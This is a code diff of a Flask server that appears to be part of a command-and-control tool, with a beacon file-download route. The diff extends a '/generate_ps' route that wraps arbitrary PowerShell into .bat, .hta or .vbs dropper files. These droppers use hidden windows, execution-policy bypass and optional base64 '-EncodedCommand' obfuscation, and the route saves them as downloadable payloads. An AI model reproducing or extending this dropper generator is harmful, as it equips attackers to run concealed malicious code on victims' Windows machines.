@@ -445,6 +445,7 @@ def download_file_from_beacon(hostname):
     conn.commit()
     conn.close()
     return jsonify({"status": "queued"})
+
 @app.route('/generate_ps', methods=['GET', 'POST'])
 def generate_ps():
     output_path = None
@@ -452,30 +453,47 @@ def generate_ps():
         ps1_code = request.form.get('ps1')
         wrapper = request.form.get('format')
         filename = request.form.get('filename') or f"dropper_{wrapper}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{wrapper}"
+        use_b64 = request.form.get('b64encode')  # Checkbox is present if checked, None if not
 
         dropper_code = ""
-        if wrapper == "bat":
-            dropper_code = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps1_code.strip()}"'
-        elif wrapper == "hta":
-            # 🔥 Use BASE64 encoding for multiline payloads
+
+        if use_b64:  # If checkbox is checked, use base64 encoding for all formats
             b64 = to_base64_ps(ps1_code)
-            dropper_code = f'''<script language="VBScript">
+            if wrapper == "bat":
+                dropper_code = f'powershell -nop -w hidden -ep bypass -EncodedCommand {b64}'
+            elif wrapper == "hta":
+                dropper_code = f'''<script language="VBScript">
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell -w hidden -ep bypass -EncodedCommand {b64}"
 self.close
 </script>'''
-        elif wrapper == "vbs":
-            dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell -w hidden -ep bypass -command "{ps1_code.strip()}"", 0'''
+            elif wrapper == "vbs":
+                dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w hidden -ep bypass -EncodedCommand {b64}", 0'''
+        else:  # Fallback to direct inline (works for single-line/simple scripts)
+            if wrapper == "bat":
+                dropper_code = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps1_code.strip()}"'
+            elif wrapper == "hta":
+                # This is NOT reliable for multiline, so recommend b64
+                safe_ps = ps1_code.replace('\n', ';').replace('"', '\\"')
+                dropper_code = f'''<script language="VBScript">
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w hidden -ep bypass -command \"{safe_ps}\""
+self.close
+</script>'''
+            elif wrapper == "vbs":
+                safe_ps = ps1_code.replace('\n', ';').replace('"', '\\"')
+                dropper_code = f'''Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w hidden -ep bypass -command \"{safe_ps}\"", 0'''
 
         output_dir = os.path.join("server", "static", "payloads")
         os.makedirs(output_dir, exist_ok=True)
-        output_path = os.path.join(output_dir, filename)
+        full_output_path = os.path.join(output_dir, filename)
 
-        with open(output_path, "w") as f:
+        with open(full_output_path, "w") as f:
             f.write(dropper_code)
 
-        output_path = filename  # just the filename for the download link
+        output_path = filename  # Just filename for link
 
     return render_template("generate_ps.html", output_path=output_path)
 
